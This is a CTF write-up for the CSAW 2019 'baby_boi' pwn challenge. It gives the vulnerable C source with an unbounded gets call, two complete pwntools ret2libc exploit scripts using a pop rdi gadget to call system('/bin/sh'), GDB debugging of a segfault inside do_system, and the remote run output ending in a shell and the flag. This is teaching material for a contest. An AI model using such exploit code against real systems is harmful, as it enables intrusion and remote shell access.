I"W<p>This binary had a very simple stack buffer overflow with NX enabled. It required a ret2libc attack, however calling <code class="highlighter-rouge">system</code> once didn’t work because of the condition the stack was in, so I had to add more input into the payload to create a valid stack frame. More information in the writeup.</p>

<h3 id="challenge">Challenge</h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 50</li>
  <li><strong>Solves:</strong> ~300</li>
</ul>

<blockquote>
  <p>Welcome to pwn.</p>

  <p>nc pwn.chal.csaw.io 1005</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>We are given the following source code for the binary:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Here I am: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">printf</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>If you are unfamiliar with how a ret2libc exploit works, I suggest reading up my writeup of <a href="/pwn/2019/06/23/hsctf-binary-exploitation-challenges.html#storytime">Storytime from HSCTF-6</a>.</p>

<p>For this challenge specifically, when running the program, we get given <code class="highlighter-rouge">printf</code>’s libc address which we can easily use to calculate the address of <code class="highlighter-rouge">system</code> and the string <code class="highlighter-rouge">/bin/sh</code> in libc. The following exploit is what I used initially:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./baby_boi'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'pwn.chal.csaw.io'</span><span class="p">,</span> <span class="mi">1005</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">bps</span><span class="p">):</span>
    <span class="n">gdbscript</span> <span class="o">=</span> <span class="s">''</span>

    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">bps</span><span class="p">:</span>
        <span class="n">gdbscript</span> <span class="o">+=</span> <span class="s">'b *0x{:x}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>

    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([</span><span class="mh">0x40072e</span><span class="p">])</span> <span class="c1"># ret in main
</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">': '</span><span class="p">)</span>

<span class="n">printf_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'printf at: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_leak</span><span class="p">))</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">printf_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2155f</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'pop rdi: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>It simply runs the program, takes the address of <code class="highlighter-rouge">printf</code> given to it, calculates offsets to <code class="highlighter-rouge">system</code> and <code class="highlighter-rouge">/bin/sh</code>, then calls <code class="highlighter-rouge">system('/bin/sh')</code>. The <code class="highlighter-rouge">pop rdi</code> gadget address was found by running <code class="highlighter-rouge">ROPgadget --binary ./libc-2.27.so | grep "pop rdi"</code>.</p>

<p>However, initially running this exploit resulted in a segfault. I couldn’t figure out why, so I spun up my Ubuntu Bionic VM to replicate the conditions of the remote binary (I knew to use Bionic because the libc version given to us was 2.27, which comes pre-installed with Bionic). Running the exploit locally then also resulted in a segfault.</p>

<p>I ran the binary with <code class="highlighter-rouge">tmux</code> and <code class="highlighter-rouge">./exploit.py GDB</code> to step through it with GDB. I set a breakpoint on the <code class="highlighter-rouge">ret</code> instruction from main (refer to my script for further details), and I realized that it was seg faulting in the call to <code class="highlighter-rouge">system</code>. GDB specifically said that the seg fault happened in <code class="highlighter-rouge">do_system+679</code>, which has the instruction <code class="highlighter-rouge">mov rcx, [rsp+0x178]</code>, so I restarted the exploit, and after hitting the breakpoint at the end of main, I did a <code class="highlighter-rouge">b *do_system+679</code> to set a breakpoint on that instruction.</p>

<p>Continuing on from there, the breakpoint at <code class="highlighter-rouge">do_system+679</code> was hit, and I inspected the stack at <code class="highlighter-rouge">rsp+0x178</code> by doing <code class="highlighter-rouge">x/gx $rsp+0x178</code> and found that the stack value was an invalid address. That’s why it was segfaulting. <code class="highlighter-rouge">[rsp+0x178]</code> will dereference that invalid address resulting in a segfault.</p>

<p>The way I solved the challenge then was to append some valid addresses to my payload. Remember that the payload is put on the stack, so chances are if we keep adding valid addresses to the payload, one of those addresses will overwrite this address on the stack and prevent the segfault. I just ended up calling <code class="highlighter-rouge">system('/bin/sh')</code> twice, as seen in my final payload below. Appending any valid address to the stack would have been fine though.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./baby_boi'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'pwn.chal.csaw.io'</span><span class="p">,</span> <span class="mi">1005</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">bps</span><span class="p">):</span>
    <span class="n">gdbscript</span> <span class="o">=</span> <span class="s">''</span>

    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">bps</span><span class="p">:</span>
        <span class="n">gdbscript</span> <span class="o">+=</span> <span class="s">'b *0x{:x}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>

    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([</span><span class="mh">0x40072e</span><span class="p">])</span> <span class="c1"># ret in main
</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">': '</span><span class="p">)</span>

<span class="n">printf_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'printf at: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_leak</span><span class="p">))</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">printf_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2155f</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'pop rdi: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/libc-2.27.so'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to pwn.chal.csaw.io on port 1005: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">printf </span>at: 0x7f10fe591e80
<span class="o">[</span><span class="k">*</span><span class="o">]</span> libc base: 0x7f10fe52d000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f10fe57c440
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh: 0x7f10fe6e0e9a
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pop rdi: 0x7f10fe54e55f
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>baby_boi
flag.txt
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
flag<span class="o">{</span>baby_boi_dodooo_doo_doo_dooo<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">flag{baby_boi_dodooo_doo_doo_dooo}</code></p>
:ET